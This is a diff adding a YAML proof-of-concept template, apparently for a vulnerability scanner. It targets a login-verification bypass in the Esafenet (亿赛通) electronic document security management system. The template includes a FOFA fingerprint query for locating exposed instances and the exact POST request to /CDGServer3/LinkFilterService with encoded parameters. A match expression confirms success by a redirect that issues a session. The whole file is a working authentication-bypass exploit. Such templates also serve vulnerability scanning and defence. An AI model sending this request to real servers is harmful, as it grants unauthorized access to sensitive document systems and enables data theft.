@@ -1,0 +1,20 @@
+id: poc-yaml-yisaitong-esafenet-linkfilterservice-login
+info:
+  name: 亿赛通电子文档安全管理系统 登录验证绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 亿赛通电子文档安全管理系统
+  fofa: body="/CDGServer3/index.jsp"
+requests:
+- method: POST
+  path: /CDGServer3/LinkFilterService
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+
+    '
+  expression: "status_code == 302 && \nbody == \"\" &&\ncontains(headers,\"/CDGServer3/frame.jsp;jsessionid=\"\
+    ) &&\ncontains(headers,\"Set-Cookie: CDGServerLanguage=\")\n"
+variables: {}
+transport: http
